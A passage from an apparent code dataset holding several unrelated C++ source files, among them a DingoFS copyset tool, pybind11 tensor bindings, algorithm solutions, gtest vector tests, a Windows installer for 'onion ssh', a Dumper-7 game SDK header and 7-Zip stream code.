FLAGS_poolId\n            << \" [-metaserverAddr=\" << FLAGS_metaserverAddr << \"]\";\n  std::cout << std::endl;\n}\n\nint GetCopysetStatusTool::Init() {\n  if (DingofsToolRpc::Init() != 0) {\n    return -1;\n  }\n\n  dingofs::utils::SplitString(FLAGS_metaserverAddr, \",\", &hostsAddr_);\n\n  std::vector<std::string> copysetsId;\n  dingofs::utils::SplitString(FLAGS_copysetId, \",\", &copysetsId);\n  std::vector<std::string> poolsId;\n  dingofs::utils::SplitString(FLAGS_poolId, \",\", &poolsId);\n  if (copysetsId.size() != poolsId.size()) {\n    std::cerr << \"copysets not match pools.\" << std::endl;\n    return -1;\n  }\n  pb::metaserver::copyset::CopysetsStatusRequest request;\n  for (size_t i = 0; i < poolsId.size(); ++i) {\n    auto copysetKey = request.add_copysets();\n    auto poolId = std::stoul(poolsId[i]);\n    auto copysetId = std::stoul(copysetsId[i]);\n    copysetKey->set_poolid(poolId);\n    copysetKey->set_copysetid(copysetId);\n    key_.push_back((poolId << 32) | copysetId);\n  }\n  AddRequest(request);\n\n  service_stub_func_ = std::bind(\n      &pb::metaserver::copyset::CopysetService_Stub::GetCopysetsStatus,\n      service_stub_.get(), std::placeholders::_1, std::placeholders::_2,\n      std::placeholders::_3, nullptr);\n  return 0;\n}\n\nint GetCopysetStatusTool::RunCommand() { return DingofsToolRpc::RunCommand(); }\n\nbool GetCopysetStatusTool::AfterSendRequestToHost(const std::string& host) {\n  bool ret = true;\n  if (controller_->Failed()) {\n    errorOutput_ << \"get copyset status from metaserver: \" << host\n                 << \" failed, errorcode= \" << controller_->ErrorCode()\n                 << \", error text \" << controller_->ErrorText() << \"\\n\";\n    ret = false;\n  } else {\n    auto copysetsStatus = response_->status();\n    for (size_t i = 0; i < key_.size(); i++) {\n      key2CopysetStatus_[key_[i]].push_back(copysetsStatus[i].copysetstatus());\n    }\n  }\n  if (show_) {\n    for (auto const& i : key2CopysetStatus_) {\n      std::cout << \"copyset[\" << i.first << \"]:\" << std::endl;\n      for (auto const& j : i.second) {\n        std::cout << j.DebugString() << std::endl;\n      }\n    }\n  }\n  return ret;\n}\n\nvoid GetCopysetStatusTool::AddUpdateFlags() {\n  AddUpdateFlagsFunc(dingofs::tools::SetMetaserverAddr);\n}\n\nbool GetCopysetStatusTool::CheckRequiredFlagDefault() {\n  google::CommandLineFlagInfo info;\n  if (CheckPoolIdDefault(&info) && CheckCopysetIdDefault(&info)) {\n    std::cerr << \"no -poolId=*,* -copysetId=*,* , please use -example!\"\n              << std::endl;\n    return true;\n  }\n  return false;\n}\n\n}  // namespace copyset\n}  // namespace tools\n}  // namespace dingofs\n",
    "#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <pybind11/numpy.h>\n#include \"Tensor.h\"\n#include \"Module.h\"\n\nnamespace py = pybind11;\n\nTensor tensor_from_numpy(py::array_t<float> data){\n    std::vector<int> shape(data.ndim());\n    for (int i = 0; i < shape.size(); i++){\n        shape[i] = data.shape(i);\n    }\n    Tensor tensor(shape, Device::CPU);\n    for (int i = 0; i < tensor.length(); i++){\n        tensor.data()[i] = data.data()[i];\n    }\n    return tensor;\n}\n\nPYBIND11_MODULE(MyTensor, m) {\n    // \u7ed1\u5b9a\u679a\u4e3e\u7c7b\u578b\n    py::enum_<Device>(m, \"Device\")\n        .value(\"CPU\", Device::CPU)\n        .value(\"GPU\", Device::GPU)\n        .export_values();\n\n    // \u7ed1\u5b9a Tensor \u7c7b\n    py::class_<Tensor>(m, \"Tensor\")\n        .def(py::init<const std::vector<int> &, Device>())\n        .def(\"cpu\", &Tensor::cpu)\n        .def(\"gpu\", &Tensor::gpu)\n        .def(\"assign\", &Tensor::assign)\n        .def(\"Print\", &Tensor::Print)\n        .def(\"to_numpy\", [](Tensor &tensor) {\n                // \u8f6cnumpy\u65f6\u5185\u5b58\u8f6ccpu\uff0c\u7edf\u4e00\u5185\u5b58\u7ba1\u7406\n                tensor = tensor.cpu();\n                return py::array_t<float>(tensor.shape_, tensor.data());\n             })\n        .def(\"shape\",[](Tensor &tensor) {return tensor.shape_;})\n        .def(\"dtype\",[](Tensor &tensor) {return tensor.device_;});\n\n    // \u7ed1\u5b9a Module \u51fd\u6570\n    m.def(\"forward_sigmoid\", &Sigmoid)\n        .def(\"backward_sigmoid\", &Sigmoid_backward)\n        .def(\"forward_relu\", &Relu)\n        .def(\"backward_relu\", &Relu_backward)\n        .def(\"forward_fc\", &forward_fc)\n        .def(\"backward_fc\", &backward_fc)\n        .def(\"forward_conv\", &forward_conv)\n        .def(\"backward_conv\", &backward_conv)\n        .def(\"forward_maxpool\", &forward_maxpool)\n        .def(\"backward_maxpool\", &backward_maxpool)\n        .def(\"forward_softmax\", &forward_softmax)\n        .def(\"forward_cross_entropy\", &forward_cross_entropy)\n        .def(\"backward_cross_entropy\", &backward_cross_entropy)\n        .def(\"tensor_from_numpy\", &tensor_from_numpy)\n        .def(\"ewise_add\", &EWiseAdd)\n        .def(\"add_scalar\", &AddScalar)\n        .def(\"ewise_mul\", &EWiseMul)\n        .def(\"mul_scalar\", &MulScalar)\n        .def(\"power_scalar\", &PowerScalar)\n        .def(\"ewise_pow\", &EWisePow)\n        .def(\"ewise_div\", &EWiseDiv)\n        .def(\"div_scalar\", &DivScalar)\n        .def(\"negate\", &Negate)\n        .def(\"log\", &Log)\n        .def(\"exp\", &Exp)\n        .def(\"matmul\", &Matmul)\n        .def(\"reshape\", &Reshape);\n\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: kammi <kammi@student.42.fr>                +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/12/12 11:52:59 by kammi             #+#    #+#             */\n/*   Updated: 2025/01/02 12:33:12 by kammi            ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"easyfind.hpp\"\n#include <vector>\n#include <list>\n\nint\tmain()\n{\n\tstd::vector<int> vec;\n\n\tfor (int i = 0; i < 20; i++)\n\t\tvec.push_back(i);\n\n\ttry\n\t{\n\t\teasyfind(vec, 3);\n\t\teasyfind(vec, 25);\n\t}\n\tcatch (std::exception &e)\n\t{\n\t\tstd::cout << \"Value not found\" << std::endl;\n\t}\n\n\t//test with list\n\tstd::list<int> lst;\n\t\n\tfor (int i = 0; i < 20; i++)\n\t\tlst.push_back(i);\n\t\n\ttry\n\t{\n\t\teasyfind(lst, 3);\n\t\teasyfind(lst, 25);\n\t}\n\tcatch (std::exception &e)\n\t{\n\t\tstd::cout << \"Value not found\" << std::endl;\n\t}\n\treturn 0;\n}\n",
    "// Count distinct elements in every window\n// https://www.geeksforgeeks.org/problems/count-distinct-elements-in-every-window/1\n\n//{ Driver Code Starts\n// Initial Template for C++\n#include <bits/stdc++.h>\nusing namespace std;\n\n\n// } Driver Code Ends\n\nclass Solution {\n  public:\n    vector<int> countDistinct(vector<int> &arr, int k) {\n        // code here.\n        map<int,int> mp;\n        vector<int> ans;\n        int n=arr.size();\n        for(int i=0;i<k;i++){\n            mp[arr[i]]++;\n        }\n        ans.push_back(mp.size());\n        for(int i=k;i<n;i++){\n            mp[arr[i-k]]--;\n            mp[arr[i]]++;\n            if(mp[arr[i-k]]==0){\n                mp.erase(arr[i-k]);\n            }\n            ans.push_back(mp.size());\n        }\n        return ans;\n    }\n};\n\n//{ Driver Code Starts.\n\nint main() {\n\n    int t;\n    cin >> t;\n    cin.ignore();\n    while (t--) {\n        vector<int> arr;\n        string input;\n        getline(cin, input);\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n        string ks;\n        getline(cin, ks);\n        int k = stoi(ks);\n        Solution obj;\n        vector<int> res = obj.countDistinct(arr, k);\n        for (auto it : res)\n            cout << it << \" \";\n        cout << endl;\n        cout << \"~\"\n             << \"\\n\";\n    }\n\n    return 0;\n}\n\n// } Driver Code Ends",
    "#include <iostream>\n#include <windows.h>\n#include <fstream>\n#include <cctype>//std::isalnum\n\n#include \"classes/resource.h\"\n#include \"classes/dll_methods.hpp\"\n\nstd::string tmpPath = \"\";\nstd::string title = \"onion ssh\";\nDLL_METHODS dllMethods;\n\nint unpackRCResource(int definedVar, std::string name, std::string dropLocation) {\n    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(definedVar), RT_RCDATA);\n    if (!hRes) {\n        return 1;\n    }\n    HGLOBAL hLoadRes = LoadResource(NULL, hRes);\n    DWORD resSize = SizeofResource(NULL, hRes);\n    void* pResData = LockResource(hLoadRes);\n    if (!pResData || resSize == 0) {\n        return 2;\n    }\n    std::ofstream tmpFile(dropLocation + name, std::ios::binary);\n    tmpFile.write(reinterpret_cast<const char*>(pResData), resSize);\n    tmpFile.close();\n    return 0;\n}\n\nbool isAdmin() {\n    BOOL isAdmin = FALSE;\n    PSID adminGroup = NULL;\n    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;\n\n    if (!AllocateAndInitializeSid(\n            &ntAuthority,\n            2,\n            SECURITY_BUILTIN_DOMAIN_RID,\n            DOMAIN_ALIAS_RID_ADMINS,\n            0, 0, 0, 0, 0, 0,\n            &adminGroup)) {\n        std::cerr << \"AllocateAndInitializeSid failed. Error: \" << GetLastError() << std::endl;\n        return false;\n    }\n\n    if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {\n        std::cerr << \"CheckTokenMembership failed. Error: \" << GetLastError() << std::endl;\n        isAdmin = FALSE;\n    }\n\n    if (adminGroup) {\n        FreeSid(adminGroup);\n    }\n\n    return isAdmin;\n}\n\nstd::string selectFolder(std::string desc) {\n    while (true) {\n        std::string buff = \"\";\n        dllMethods.quietShell((\"powershell Add-Type -AssemblyName System.Windows.Forms; $dialog = New-Object System.Windows.Forms.FolderBrowserDialog; $dialog.Description = '\" + desc + \"'; $dialog.ShowNewFolderButton = $true; if ($dialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) { $dialog.SelectedPath } else { 'empty' }\").c_str(), buff);\n        std::string finalBuff = \"\";\n        for (char& c : buff) {\n            if (std::isalnum(c) || c == '\\\\' || c == '/' || c == '_' || c == ' ' || c == '.' || c == '-' || c == '(' || c == ')' || c == '+' || c == '=' || c == ',' || c == ';' || c == '\\'' || c == '!' || c == '$' || c == '&' || c == '@' || c == '^' || c == '~' || c == '[' || c == ']' || c == '{' || c == '}' || c == ':') {\n                finalBuff += c;\n            }\n        }\n        if (finalBuff != \"empty\") {\n            return finalBuff;\n        }\n        else {\n            dllMethods.msgBox((title + \" installer\").c_str(), \"No folder selected, installation aborted.\", \"\", \"e\", buff);\n            exit(1);\n        }\n    }\n}\n\nvoid setTmpPath(std::string& path) {\n    char buff[MAX_PATH];\n    GetTempPath(MAX_PATH, buff);\n    path = std::string(buff);\n}\n\nvoid abortInstall(HMODULE DLL, std::string msg = \"Installation aborted\") {\n    std::string buff = \"\";\n    dllMethods.msgBox((title + \" installer\").c_str(), (msg).c_str(), \"\", \"i\", buff);\n    FreeLibrary(DLL);\n    exit(0);\n}\n\nvoid unzip(std::string from, std::string to) {\n    std::string buff = \"\";\n    dllMethods.quietShell((\"powershell Expand-Archive -Path '\" + from + \"' -DestinationPath '\" + to + \"' -Force\").c_str(), buff);\n}\n\nvoid del(std::string file) {\n    std::string buff = \"\";\n    dllMethods.quietShell((\"del /f \\\"\" + file + \"\\\"\").c_str(), buff);\n}\n\nint main() {\n    setTmpPath(tmpPath);\n    if (unpackRCResource(ASSET_WHITEAVOCADO_DLL, \"whiteavocado64.dll\", tmpPath) != 0) {\n        std::cout << \"data/whiteavocado64.dll not found. Aborted.\";\n        return 2;\n    }\n    HMODULE const DLL = LoadLibraryExA((tmpPath + \"whiteavocado64.dll\").c_str(), nullptr, 0);\n    dllMethods = loadDllMethods(DLL);\n    std::string buff = \"\";\n\n    if (!isAdmin()) {\n        abortInstall(DLL, \"Installation aborted. You should run the installer as admin.\");\n    }\n\n    dllMethods.msgBox((title + \" installer\").c_str(), (\"Thanks for downloading Onion ssh!\\n\\nWould you like to install \" + title + \"?\").c_str(), \"yn\", \"q\", buff);\n    if (buff != \"yes\") {\n        abortInstall(DLL);\n    }\n    std::string destenationPath = \"\";\n    while (true) {\n        destenationPath = selectFolder(\"Please select a location where to install \" + title);\n        dllMethods.msgBox((title + \"installer\").c_str(), (title + \" will get installed at:\\n\" + destenationPath + \"\\n\\nDo you agree?\").c_str(), \"yn\", \"q\", buff);\n        if (buff != \"yes\") {\n            dllMethods.msgBox((title + \" installer\").c_str(), \"Would you like to choose another location?\", \"yn\", \"q\", buff);\n            if (buff != \"yes\") {\n                abortInstall(DLL);\n            }\n            continue;\n        }\n        break;\n    }\n    std::string packageName = \"onion_ssh.zip\";\n    if (unpackRCResource(ASSET_ONION_SSH, packageName, (destenationPath + \"/\").c_str()) != 0) {\n        abortInstall(DLL, \"Installation aborted. Could not extract onion ssh.\");\n    }\n    std::string fullFilePath = destenationPat",
    "#include <algorithm>\n#include <initializer_list>\n#include <iterator>\n#include <numeric>\n#include <ftl/core.hpp>\n#include <gtest/gtest.h>\n\nnamespace test {\n  using VectorT = ftl::vector<double>;\n\n  void AssertInvariants(const VectorT& vector, VectorT::size_type size)\n  {\n    auto beg = vector.cbegin();\n    auto end = vector.cend();\n    ASSERT_EQ(vector.empty(), size == 0);\n    ASSERT_EQ(beg == end, size == 0);\n    ASSERT_EQ(vector.data() == nullptr, vector.capacity() == 0);\n    ASSERT_EQ(vector.size(), size);\n    ASSERT_GE(vector.capacity(), size);\n    ASSERT_EQ(std::distance(beg, end), size);\n    ASSERT_LE(beg, end);\n    if (size > 0) {\n      EXPECT_EQ(vector.front(), *vector.cbegin());\n      EXPECT_EQ(vector.back(), *(vector.cend() - 1));\n    }\n  }\n\n  void AssertAllElementsEqual(const VectorT& vec,\n      const VectorT::value_type& expected)\n  {\n    EXPECT_TRUE(std::all_of(vec.cbegin(), vec.cend(),\n        [&expected](const auto& x) { return x == expected; }));\n  }\n\n  void AssertVectorsEqual(const VectorT& vec1, const VectorT& vec2)\n  {\n    EXPECT_EQ(vec1.size(), vec2.size());\n    EXPECT_TRUE(std::equal(vec1.cbegin(), vec1.cend(), vec2.cbegin()));\n  }\n\n  class VectorTest : public ::testing::Test\n  {\n  protected:\n    void SetUp() override\n    {\n      filled = VectorT(100);\n      empty = VectorT();\n      std::iota(filled.begin(), filled.end(), 0);\n      copy = filled;\n    }\n    VectorT filled;\n    VectorT empty;\n    VectorT copy;\n  };\n\n  TEST(VectorConstructor, Default)\n  {\n    VectorT empty;\n    AssertInvariants(empty, 0);\n  }\n\n  TEST(VectorConstructor, Allocator)\n  {\n    std::allocator<VectorT::value_type> alloc;\n    VectorT vector(alloc);\n    AssertInvariants(vector, 0);\n  }\n\n  TEST(VectorConstructor, Size)\n  {\n    size_t size = 100;\n    VectorT::value_type val{};\n    VectorT vector(size);\n    AssertInvariants(vector, size);\n    AssertAllElementsEqual(vector, val);\n  }\n\n  TEST(VectorConstructor, SizeAndValue)\n  {\n    size_t size = 100;\n    VectorT::value_type val(7);\n    VectorT vector(size, val);\n    AssertInvariants(vector, size);\n    AssertAllElementsEqual(vector, val);\n  }\n\n  TEST(VectorConstructor, Iterators)\n  {\n    auto values = { 1, 2, 3, 4, 5, 6, 7, 8, 9 };\n    VectorT vector(values.begin(), values.end());\n    AssertInvariants(vector, values.size());\n    EXPECT_TRUE(std::equal(vector.begin(), vector.end(), values.begin()));\n  }\n\n  TEST(VectorConstructor, InitializerList)\n  {\n    std::initializer_list<VectorT::value_type> values = { 1, 2, 3, 4, 5, 6, 7 };\n    VectorT vector(values);\n    AssertInvariants(vector, values.size());\n    EXPECT_TRUE(std::equal(vector.begin(), vector.end(), values.begin()));\n  }\n\n  TEST(VectorConstructor, Copy)\n  {\n    VectorT vector(100, 7);\n    VectorT copy(vector);\n    AssertInvariants(copy, vector.size());\n    AssertVectorsEqual(vector, copy);\n  }\n\n  TEST(VectorConstructor, Move)\n  {\n    VectorT vector(100, 7);\n    VectorT copy(vector);\n    VectorT moved(std::move(vector));\n    AssertInvariants(moved, copy.size());\n    AssertVectorsEqual(copy, moved);\n  }\n\n  TEST(VectorAssignmentOperator, Move)\n  {\n    VectorT vector(100, 7);\n    VectorT copy(vector);\n    VectorT moved;\n    moved = std::move(vector);\n    AssertInvariants(moved, copy.size());\n    AssertVectorsEqual(copy, moved);\n  }\n\n  TEST(VectorAssignmentOperator, Copy)\n  {\n    VectorT vector(100, 7);\n    VectorT copy;\n    copy = vector;\n    AssertInvariants(copy, vector.size());\n    AssertVectorsEqual(copy, copy);\n  }\n\n  TEST_F(VectorTest, ReverseIterators)\n  {\n    auto rbeg = filled.rbegin();\n    auto rend = filled.rend();\n    EXPECT_EQ(*rbeg, filled.back());\n    EXPECT_EQ(*(rend - 1), filled.front());\n  }\n\n  TEST_F(VectorTest, IteratorInvalidationOnReallocation)\n  {\n    auto it = filled.begin();\n    filled.reserve(filled.capacity() * 2);\n    EXPECT_NE(it, filled.begin());\n  }\n\n  TEST_F(VectorTest, DataPointer)\n  {\n    EXPECT_EQ(filled.data(), std::addressof(filled.front()));\n    EXPECT_EQ(empty.data(), nullptr);\n  }\n\n  TEST_F(VectorTest, OperatorBracketAccess)\n  {\n    auto value = 111;\n    auto index = filled.size() - 1;\n    filled[filled.size() - 1] = value;\n    EXPECT_EQ(filled[index], value);\n    const VectorT& const_filled = filled;\n    EXPECT_EQ(const_filled[index], value);\n  }\n\n  TEST_F(VectorTest, AtValidIndex)\n  {\n    auto value = 111;\n    auto index = filled.size() - 1;\n    filled.at(index) = value;\n    EXPECT_EQ(filled.at(index), value);\n    const VectorT& const_filled = filled;\n    EXPECT_EQ(const_filled.at(index), value);\n  }\n\n  TEST_F(VectorTest, AtOutOfRange)\n  {\n    EXPECT_THROW(filled.at(filled.size()), std::out_of_range);\n    EXPECT_THROW(empty.at(0), std::out_of_range);\n  }\n\n  TEST_F(VectorTest, PushBack)\n  {\n    auto val = VectorT::value_type(77);\n    filled.push_back(val);\n    AssertInvariants(filled, copy.size() + 1);\n    EXPECT_EQ(filled.back(), val);\n    EXPECT_TRUE(std::equal(copy.begin(), copy.end(), filled.begin()));\n  }\n\n  TEST_F(VectorTest, PushBackEmpty)\n  {\n    auto val = VectorT::valu",
    "// Authored by : scsc3204\n// Co-authored by : -\n// http://boj.kr/7ea13fdf01044049950a56fec972210c\n#include <bits/stdc++.h>\nusing namespace std;\n\nconst int MX = 300;\nconst int INF = 0x3f3f3f3f;\n\nint h[MX + 2][MX + 2];\n\nint main() {\n  ios::sync_with_stdio(0);\n  cin.tie(0);\n\n  int n, m, t;\n  cin >> n >> m >> t;\n\n  for(int i = 1; i <= n; i++)\n    fill(h[i], h[i] + MX + 1, INF);\n\n  for(int i = 1; i <= n; i++)\n    h[i][i] = 0;\n\n  while(m--) {\n    int u, v, height; \n    cin >> u >> v >> height;\n    h[u][v] = height;\n  }\n\n  for(int k = 1; k <= n; k++)\n    for(int i = 1; i <= n; i++)\n      for(int j = 1; j <= n; j++)\n        h[i][j] = min(h[i][j], max(h[i][k], h[k][j]));\n\n  while(t--) {\n    int st, en;\n    cin >> st >> en;\n    if(h[st][en] == INF) cout << -1 << '\\n';\n    else cout << h[st][en] << '\\n';\n  }\n}\n/*\n\ud604\uc7ac\uae4c\uc9c0 \uacc4\uc0b0\ub41c i\uc5d0\uc11c j\ub85c \uac00\ub294 \uae38\ubaa9\uc758 \ud5c8\ub4e4 \ub192\uc774\ub97c h[i][j]\ub77c \ud558\uc790.\n\n\ud50c\ub85c\uc774\ub4dc \uc54c\uace0\ub9ac\uc998\uc744 \ud1b5\ud574 N\uac1c \ub178\ub4dc\ub97c \uacbd\uc720\ud558\uba74\uc11c\nh[i][j]\ub97c \uc544\ub798 \ub450 \uac12 \uc911 \uc791\uc740 \uac12\uc73c\ub85c \uac31\uc2e0\ud55c\ub2e4(31\ubc88\uc9f8 \uc904).\n  1. h[i][j]\uc758 \ud604\uc7ac \uac12\n  2. i -> k -> j \uacbd\ub85c\ub85c \uac08 \ub54c\uc758 \uae38\ubaa9 \uc0c1 \ucd5c\ub300 \ud5c8\ub4e4 \ub192\uc774\n    - h[i][k], h[k][j] \uc911 \ud070 \uac12\n*/",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hasuraflutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: AOE_Commando_KeepOutExplosion\n\n#include \"Basic.hpp\"\n\n#include \"AOE_Commando_KeepOutExplosion_classes.hpp\"\n#include \"AOE_Commando_KeepOutExplosion_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.ExecuteUbergraph_AOE_Commando_KeepOutExplosion\n// ()\n// Parameters:\n// int32                                   EntryPoint                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid AAOE_Commando_KeepOutExplosion_C::ExecuteUbergraph_AOE_Commando_KeepOutExplosion(int32 EntryPoint)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"ExecuteUbergraph_AOE_Commando_KeepOutExplosion\");\n\n\tParams::AOE_Commando_KeepOutExplosion_C_ExecuteUbergraph_AOE_Commando_KeepOutExplosion Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.ReceiveBeginPlay\n// (Event, Protected, BlueprintEvent)\n\nvoid AAOE_Commando_KeepOutExplosion_C::ReceiveBeginPlay()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"ReceiveBeginPlay\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.ReceiveDestroyed\n// (Event, Public, BlueprintEvent)\n\nvoid AAOE_Commando_KeepOutExplosion_C::ReceiveDestroyed()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"ReceiveDestroyed\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.Send_Info\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n// float                                   Radius_0                                               (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid AAOE_Commando_KeepOutExplosion_C::Send_Info(float Radius_0)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"Send_Info\");\n\n\tParams::AOE_Commando_KeepOutExplosion_C_Send_Info Parms{};\n\n\tParms.Radius_0 = Radius_0;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.UserConstructionScript\n// (Event, Public, BlueprintCallable, BlueprintEvent)\n\nvoid AAOE_Commando_KeepOutExplosion_C::UserConstructionScript()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"UserConstructionScript\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AOE_Commando_KeepOutExplosion.AOE_Commando_KeepOutExplosion_C.OnRep_Radius\n// (HasDefaults, BlueprintCallable, BlueprintEvent)\n\nvoid AAOE_Commando_KeepOutExplosion_C::OnRep_Radius()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AOE_Commando_KeepOutExplosion_C\", \"OnRep_Radius\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n}\n\n",
    "// StreamObjects.cpp\r\n\r\n#include \"StdAfx.h\"\r\n\r\n#include <stdlib.h>\r\n\r\n#include \"../../../C/Alloc.h\"\r\n\r\n#include \"StreamObjects.h\"\r\n\r\nSTDMETHODIMP CBufferInStream::Read(void *data, UInt32 size, UInt32 *processedSize)\r\n{\r\n  if (processedSize)\r\n    *processedSize = 0;\r\n  if (size == 0)\r\n    return S_OK;\r\n  if (_pos >= Buf.Size())\r\n    return S_OK;\r\n  size_t rem = Buf.Size() - (size_t)_pos;\r\n  if (rem > size)\r\n    rem = (size_t)size;\r\n  memcpy(data, (const Byte *)Buf + (size_t)_pos, rem);\r\n  _pos += rem;\r\n  if (processedSize)\r\n    *processedSize = (UInt32)rem;\r\n  return S_OK;\r\n}\r\n\r\nSTDMETHODIMP CBufferInStream::Seek(Int64 offset, UInt32 seekOrigin, UInt64 *newPosition)\r\n{\r\n  switch (seekOrigin)\r\n  {\r\n    case STREAM_SEEK_SET: break;\r\n    case STREAM_SEEK_CUR: offset += _pos; break;\r\n    case STREAM_SEEK_END: offset += Buf.Size(); break;\r\n    default: return STG_E_INVALIDFUNCTION;\r\n  }\r\n  if (offset < 0)\r\n    return HRESULT_WIN32_ERROR_NEGATIVE_SEEK;\r\n  _pos = offset;\r\n  if (newPosition)\r\n    *newPosition = offset;\r\n  return S_OK;\r\n}\r\n\r\nSTDMETHODIMP CBufInStream::Read(void *data, UInt32 size, UInt32 *processedSize)\r\n{\r\n  if (processedSize)\r\n    *processedSize = 0;\r\n  if (size == 0)\r\n    return S_OK;\r\n  if (_pos >= _size)\r\n    return S_OK;\r\n  size_t rem = _size - (size_t)_pos;\r\n  if (rem > size)\r\n    rem = (size_t)size;\r\n  memcpy(data, _data + (size_t)_pos, rem);\r\n  _pos += rem;\r\n  if (processedSize)\r\n    *processedSize = (UInt32)rem;\r\n  return S_OK;\r\n}\r\n\r\nSTDMETHODIMP CBufInStream::Seek(Int64 offset, UInt32 seekOrigin, UInt64 *newPosition)\r\n{\r\n  switch (seekOrigin)\r\n  {\r\n    case STREAM_SEEK_SET: break;\r\n    case STREAM_SEEK_CUR: offset += _pos; break;\r\n    case STREAM_SEEK_END: offset += _size; break;\r\n    default: return STG_E_INVALIDFUNCTION;\r\n  }\r\n  if (offset < 0)\r\n    return HRESULT_WIN32_ERROR_NEGATIVE_SEEK;\r\n  _pos = offset;\r\n  if (newPosition)\r\n    *newPosition = offset;\r\n  return S_OK;\r\n}\r\n\r\nvoid Create_BufInStream_WithReference(const void *data, size_t size, IUnknown *ref, ISequentialInStream **stream)\r\n{\r\n  *stream = NULL;\r\n  CBufInStream *inStreamSpec = new CBufInStream;\r\n  CMyComPtr<ISequentialInStream> streamTemp = inStreamSpec;\r\n  inStreamSpec->Init((const Byte *)data, size, ref);\r\n  *stream = streamTemp.Detach();\r\n}\r\n\r\nvoid Create_BufInStream_WithNewBuffer(const void *data, size_t size, ISequentialInStream **stream)\r\n{\r\n  *stream = NULL;\r\n  CBufferInStream *inStreamSpec = new CBufferInStream;\r\n  CMyComPtr<ISequentialInStream> streamTemp = inStreamSpec;\r\n  inStreamSpec->Buf.CopyFrom((const Byte *)data, size);\r\n  inStreamSpec->Init();\r\n  *stream = streamTemp.Detach();\r\n}\r\n\r\nvoid CByteDynBuffer::Free() throw()\r\n{\r\n  free(_buf);\r\n  _buf = 0;\r\n  _capacity = 0;\r\n}\r\n\r\nbool CByteDynBuffer::EnsureCapacity(size_t cap) throw()\r\n{\r\n  if (cap <= _capacity)\r\n    return true;\r\n  size_t delta;\r\n  if (_capacity > 64)\r\n    delta = _capacity / 4;\r\n  else if (_capacity > 8)\r\n    delta = 16;\r\n  else\r\n    delta = 4;\r\n  cap = MyMax(_capacity + delta, cap);\r\n  Byte *buf = (Byte *)realloc(_buf, cap);\r\n  if (!buf)\r\n    return false;\r\n  _buf = buf;\r\n  _capacity = cap;\r\n  return true;\r\n}\r\n\r\nByte *CDynBufSeqOutStream::GetBufPtrForWriting(size_t addSize)\r\n{\r\n  addSize += _size;\r\n  if (addSize < 